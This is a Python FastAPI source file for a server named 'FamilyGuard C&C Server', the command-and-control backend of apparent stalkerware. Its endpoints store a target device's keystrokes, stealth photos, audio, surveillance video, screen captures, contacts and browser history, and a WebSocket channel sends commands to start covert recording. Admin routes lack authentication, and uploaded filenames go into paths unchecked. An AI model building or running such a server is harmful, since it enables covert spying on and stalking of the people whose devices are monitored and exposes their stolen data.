import os
import json
import logging
from datetime import datetime
from typing import List, Dict

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("FamilyGuardBackend")

app = FastAPI(title="FamilyGuard C&C Server")

# Storage paths
UPLOAD_DIR = "uploads"
LOGS_DIR = os.path.join(UPLOAD_DIR, "logs")
MEDIA_DIR = os.path.join(UPLOAD_DIR, "media")
PHOTOS_DIR = os.path.join(UPLOAD_DIR, "photos")
AUDIO_DIR = os.path.join(UPLOAD_DIR, "audio")
VIDEO_DIR = os.path.join(UPLOAD_DIR, "video")
SCREEN_DIR = os.path.join(UPLOAD_DIR, "screen")
CONTACTS_DIR = os.path.join(UPLOAD_DIR, "contacts")
HISTORY_DIR = os.path.join(UPLOAD_DIR, "history")

KEYSTROKES_DIR = os.path.join(UPLOAD_DIR, "keystrokes")

for d in [LOGS_DIR, MEDIA_DIR, PHOTOS_DIR, AUDIO_DIR, VIDEO_DIR, SCREEN_DIR, CONTACTS_DIR, HISTORY_DIR, KEYSTROKES_DIR]:
    os.makedirs(d, exist_ok=True)


# Static files for admin dashboard
app.mount("/static", StaticFiles(directory=UPLOAD_DIR), name="static")
templates = Jinja2Templates(directory="templates")

# WebSocket Manager to track connected devices
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}

    async def connect(self, device_id: str, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[device_id] = websocket
        logger.info(f"Device connected: {device_id}")

    def disconnect(self, device_id: str):
        if device_id in self.active_connections:
            del self.active_connections[device_id]
            logger.info(f"Device disconnected: {device_id}")

    async def send_command(self, device_id: str, command: dict):
        if device_id in self.active_connections:
            await self.active_connections[device_id].send_json(command)
            return True
        return False

manager = ConnectionManager()

# ──────────────────────────────────────────────────────────────────────────────
# HTTP ENDPOINTS (API)
# ──────────────────────────────────────────────────────────────────────────────

@app.post("/api/sync-logs")
async def sync_logs(request: Request):
    data = await request.json()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"logs_{timestamp}.json"
    with open(os.path.join(LOGS_DIR, filename), "w") as f:
        json.dump(data, f, indent=4)
    logger.info(f"Received logs: {filename}")
    return {"status": "success"}

@app.post("/api/sync-media")
async def sync_media(file: UploadFile = File(...)):
    file_path = os.path.join(MEDIA_DIR, file.filename)
    with open(file_path, "wb") as f:
        f.write(await file.read())
    logger.info(f"Received media: {file.filename}")
    return {"status": "success"}

@app.post("/api/sync-photo")
async def sync_photo(file: UploadFile = File(...)):
    file_path = os.path.join(PHOTOS_DIR, file.filename)
    with open(file_path, "wb") as f:
        f.write(await file.read())
    logger.info(f"Received stealth photo: {file.filename}")
    return {"status": "success"}

@app.post("/api/sync-audio")
async def sync_audio(file: UploadFile = File(...)):
    file_path = os.path.join(AUDIO_DIR, file.filename)
    with open(file_path, "wb") as f:
        f.write(await file.read())
    logger.info(f"Received audio recording: {file.filename}")
    return {"status": "success"}

@app.post("/api/sync-surveillance")
async def sync_surveillance(file: UploadFile = File(...)):
    file_path = os.path.join(VIDEO_DIR, file.filename)
    with open(file_path, "wb") as f:
        f.write(await file.read())
    logger.info(f"Received surveillance video: {file.filename}")
    return {"status": "success"}

@app.post("/api/sync-screen")
async def sync_screen(file: UploadFile = File(...)):
    file_path = os.path.join(SCREEN_DIR, file.filename)
    with open(file_path, "wb") as f:
        f.write(await file.read())
    logger.info(f"Received screen capture: {file.filename}")
    return {"status": "success"}

@app.post("/api/sync-contacts")
async def sync_contacts(request: Request):
    data = await request.json()
    device_id = data.get("device_id", "unknown")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"contacts_{device_id}_{timestamp}.json"
    with open(os.path.join(CONTACTS_DIR, filename), "w") as f:
        json.dump(data, f, indent=4)
    logger.info(f"Received contacts: {filename}")
    return {"status": "success"}

@app.post("/api/sync-history")
async def sync_history(request: Request):
    data = await request.json()
    device_id = data.get("device_id", "unknown")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"history_{device_id}_{timestamp}.json"
    with open(os.path.join(HISTORY_DIR, filename), "w") as f:
        json.dump(data, f, indent=4)
    logger.info(f"Received browser history: {filename}")
    return {"status": "success"}

@app.post("/api/sync-keystrokes")
async def sync_keystrokes(request: Request):
    data = await request.json()
    device_id = data.get("device_id", "unknown")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"keys_{device_id}_{timestamp}.json"
    with open(os.path.join(KEYSTROKES_DIR, filename), "w") as f:
        json.dump(data, f, indent=4)
    logger.info(f"Received keystrokes from {device_id}")
    return {"status": "success"}

@app.post("/api/alert")
async def receive_alert(alert: str = Form(...), type: str = Form(...)):
    logger.warning(f"SECURITY ALERT [{type}]: {alert}")
    return {"status": "received"}

# ──────────────────────────────────────────────────────────────────────────────
# WEBSOCKET ENDPOINT
# ──────────────────────────────────────────────────────────────────────────────

@app.get("/admin/keystrokes/{device_id}")
async def get_keystrokes(device_id: str):
    try:
        files = [f for f in os.listdir(KEYSTROKES_DIR) if f.startswith(f"keys_{device_id}")]
        files.sort(reverse=True) # Les plus récents en premier
        
        all_content = []
        for file in files[:5]: # Lire les 5 derniers fichiers
            with open(os.path.join(KEYSTROKES_DIR, file), "r") as f:
                all_content.append(json.load(f))
        
        return {"status": "success", "data": all_content}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.websocket("/ws/{device_id}")
async def websocket_endpoint(websocket: WebSocket, device_id: str):
    await manager.connect(device_id, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"Received from {device_id}: {data}")
    except WebSocketDisconnect:
        manager.disconnect(device_id)

# ──────────────────────────────────────────────────────────────────────────────
# ADMIN DASHBOARD
# ──────────────────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def admin_dashboard(request: Request):
    devices = list(manager.active_connections.keys())
    return templates.TemplateResponse("dashboard.html", {"request": request, "devices": devices})

@app.post("/admin/command")
async def send_command(device_id: str = Form(...), action: str = Form(...), duration: int = Form(30)):
    command = {"action": action}
    if action in ["start_surveillance", "start_screen_record", "record_audio"]:
        command["duration_sec"] = duration
        
    success = await manager.send_command(device_id, command)
    return {"status": "sent" if success else "failed", "device": device_id, "command": command}

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
